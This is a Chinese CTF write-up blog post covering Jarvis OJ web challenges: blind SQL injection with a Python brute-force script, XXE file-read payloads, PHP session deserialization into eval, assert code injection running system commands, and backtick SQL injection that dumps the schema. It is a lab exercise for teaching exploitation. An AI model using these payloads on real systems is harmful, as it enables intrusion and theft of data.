+<h3 id="0x10-Simple-Injection"><a href="#0x10-Simple-Injection" class="headerlink" title="0x10 Simple Injection"></a>0x10 Simple Injection</h3><p>打开是一个登录页面，尝试扫一波后台啥的，并没有发现什么有线索的东西。便只能尝试注入了</p>
+<h4 id="常见登录的漏洞类型"><a href="#常见登录的漏洞类型" class="headerlink" title="常见登录的漏洞类型"></a>常见登录的漏洞类型</h4><p>同时验证用户名和密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * from users where username=$usernmae <span class="keyword">and</span> password=$password</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span>($result) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"登陆失败"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="分别验证用户名和密码"><a href="#分别验证用户名和密码" class="headerlink" title="分别验证用户名和密码"></a>分别验证用户名和密码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select password from users where username='$username'"</span></span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span>($result) &#123;</span><br><span class="line">    $row = mysql_fetch_row($result);</span><br><span class="line">    $query_password = $row[$password];</span><br><span class="line">    <span class="comment">#对输入的$password进行变形</span></span><br><span class="line">    $input_password = modify($passowrd);</span><br><span class="line">    <span class="keyword">if</span>($input_password == $query_password) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"密码错误"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"用户不存在"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h4><p>尝试使用<code>username=admin&amp;password=1</code>,页面返回<code>密码错误</code> </p>
+<p>尝试使用<code>username=user&amp;password=1</code>,页面返回<code>用户名错误</code> </p>
+<p>因此这个验证方式是采用用户名和密码分步验证</p>
+<h4 id="fuzz测试"><a href="#fuzz测试" class="headerlink" title="fuzz测试"></a>fuzz测试</h4><ul>
+<li>使用<code>username=admin&#39;#&amp;password=1,页面返回</code>密码错误<code>，说明后台没有对</code>#<code>和</code>‘`进行过滤。</li>
+<li>使用<code>username=admin&#39; or 1=1#&amp;password=1，页面返回</code>用户名错误<code>，上面后台对</code>admin’ or 1=1#<code>中的部分内容进行了过滤。过滤的内容有可能是</code>or`也有可能是空格。</li>
+<li>使用<code>username=user&#39;/**/or/**/1=1#&amp;password=1，页面返回</code>密码错误`，说明输入的SQL语句能够被执行，这也表明后台仅仅是过滤了空格。</li>
+<li>总结，username存在sql注入，同时仅仅只是过滤了空格，那么就是一个盲注了</li>
+</ul>
+<h4 id="进一步测试"><a href="#进一步测试" class="headerlink" title="进一步测试"></a>进一步测试</h4><ul>
+<li><strong>查找表</strong>，<code>username=user&#39;/**/or/**/exists(select/**/*from/**/admin)#&amp;password=1</code>,页面返回<code>密码错误</code>，那么就说明在数据库中存在<code>admin</code>表</li>
+<li><strong>查找字段</strong><code>username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=1</code>，页面返回<code>密码错误</code>，说明在<code>admin</code>表中存在<code>username</code>和<code>password</code>字段。</li>
+<li><code>username=user&#39;/**/or/**/exists(select/**/count(*)/**/from/**/admin)#&amp;password=1，页面返回</code>密码错误<code>，说明在</code>admin`表中仅仅只存在一条记录，接下来就好办了</li>
+<li><strong>得到password长度</strong>，<code>username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456</code>，通过二分试探法，最终发现<code>password</code>的字段长度是32位，说明可能采用的是<code>md5</code>的方式来进行加密的。</li>
+</ul>
+<p>这样我们就可以用脚本爆破了</p>
+<p>贴上脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url = <span class="string">'http://web.jarvisoj.com:32787/login.php'</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">'xx'</span>,</span><br><span class="line">        <span class="string">"password"</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    username_template = <span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">    chars = <span class="string">'0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  in range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">for</span> char in chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            username = username_template.format(i,char_ascii)</span><br><span class="line">            payload[<span class="string">'username'</span>] = username</span><br><span class="line">            response = requests.post(url,data=payload)</span><br><span class="line">            length = len(response.text)</span><br><span class="line">            <span class="comment"># print(length)</span></span><br><span class="line">            <span class="comment">#返回的长度只有1191和1192</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">1191</span>:</span><br><span class="line">                <span class="keyword">print</span>(char)</span><br><span class="line">                result += char</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>
+
+<p>可以得到一串md5<code>334cfb59c9d74849801d5acdcfdaadc3</code> </p>
+<p>解密后输入账号密码可以得到flag</p>
+<h3 id="0x11-api调用"><a href="#0x11-api调用" class="headerlink" title="0x11 api调用"></a>0x11 api调用</h3><p>拿到题目毫无思路，上午查阅资料才发现是<code>xxe实体上传漏洞</code></p>
+<p>大概就是构造含有恶意代码的<code>xml语句</code></p>
+<p>进行文件的任意读取</p>
+<p>需要将<code>request</code>包的<code>Content-Type: application/json</code>修改为<code>Content-Type: application/xml</code>. </p>
+<p>构造<code>xml</code>内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY b SYSTEM <span class="string">"/home/ctf/flag.txt"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"file:////home/ctf/flag.txt"</span> &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"/home/ctf/flag.txt"</span> &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=index.php"</span> &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x12-PHPINFO"><a href="#0x12-PHPINFO" class="headerlink" title="0x12 PHPINFO"></a>0x12 PHPINFO</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码审计可以审计到<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;)</code> </p>
+<p>是<code>PHP session反序列化</code>：<a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">参考链接</a></p>
+<p>先在本地搭一个<code>test.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个主要是用来抓包</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'xxx'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>而我们需要做什么操作即改变<code>xxx</code>的值即可</p>
+<p><code>print_r(scandir(dirname(__FILE__)));</code> 得到目录</p>
+<p>如上构造出来序列化内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">5</span>:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125;</span></span><br><span class="line"><span class="string">|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我们做了处理，在<code>&quot;</code>前加入了<code>\</code>防止转译</p>
+<p>然后在抓包处的filename修改即可</p>
+<p><img src="/img/jarvis_6.png" alt=""></p>
+<h3 id="0x13-babyphp"><a href="#0x13-babyphp" class="headerlink" title="0x13 babyphp"></a>0x13 babyphp</h3><p>打开后搜集一波信息，发现</p>
+<p><code>&lt;!--&lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;?page=flag&quot;&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</code></p>
+<p>尝试输入<code>page=flag</code>没用</p>
+<p>上扫描器发现git泄露</p>
+<p><code>githack</code>打出<code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>assert</code>处存在代码注入，查阅一波资料发现<code>assert</code>在判断<code>false</code>后可以执行代码。于是可以构造绕过</p>
+<p>传入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//</span></span><br><span class="line"><span class="string">$file = "templates/" . '</span>,<span class="string">'..'</span>)===<span class="keyword">False</span> <span class="keyword">and</span> system(<span class="string">'cat templates/flag.php'</span>);<span class="comment">// . ".php";</span></span><br></pre></td></tr></table></figure>
+
+<p>于是就变成了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"strpos('"</span>templates/<span class="string">".','..')===False and system('cat templates/flag.php');//."</span>.php<span class="string">"',x '..') === false"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>前面闭合了<code>&#39;&#39;</code>执行<code>and</code>后面的语句，<code>//</code>用来注释</p>
+<h3 id="0x14-inject"><a href="#0x14-inject" class="headerlink" title="0x14 inject"></a>0x14 inject</h3><p>源码泄露扫到<code>index.php~</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>主要注入点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>该题属于反引号注入</p>
+<p>原理暂时没弄清楚(以后加上)大概应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc &#96;aaa&#96; &#96;bbb&#96;</span><br><span class="line">desc aaa bbb</span><br><span class="line">desc &#39;aaa&#39; &#39;bbb&#39;</span><br></pre></td></tr></table></figure>
+
+<p>第一二条相当于一个查询语句，但是具体怎么没弄清楚</p>
+<p>//以下是看了别人的<code>wp</code>所复现出来的</p>
+<p>那么我们就可以构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc &#96;test&#96; &#96;union select 1&#96;</span><br></pre></td></tr></table></figure>
+
+<p>使前面的语句被后面的语句替换,达到查询的目的,但是显示结果只有一条,所以我们利用limit进行跳跃.</p>
+<hr>
+<p>查版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32794&#x2F;index.php?table&#x3D;flag&#96; &#96;union select user() limit 1,1</span><br></pre></td></tr></table></figure>
+
+<p>查库名 61d300</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32794?table&#x3D;test&#96; &#96;union select database() limit 1,2</span><br></pre></td></tr></table></figure>
+
+<p>表名 secret_flag,secret_test</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32794?table&#x3D;test&#96; &#96;union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x363164333030 limit 1,2</span><br></pre></td></tr></table></figure>
+
+<p>字段名 flagUwillNeverKnow</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32794?table&#x3D;test&#96; &#96;union select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7365637265745f666c6167 limit 1,2</span><br></pre></td></tr></table></figure>
+
+<p>查flag flag{luckyGame~}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32794?table&#x3D;test&#96; &#96;union select flagUwillNeverKnow from secret_flag limit 1,2</span><br></pre></td></tr></table></figure>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avater.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>comical</div>
+      <div>2018-08-14</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/ctf-awd/">ctf+awd</a>
+
+      <a class="tag-link" href="/tags/ctf/" rel="tag">#ctf</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
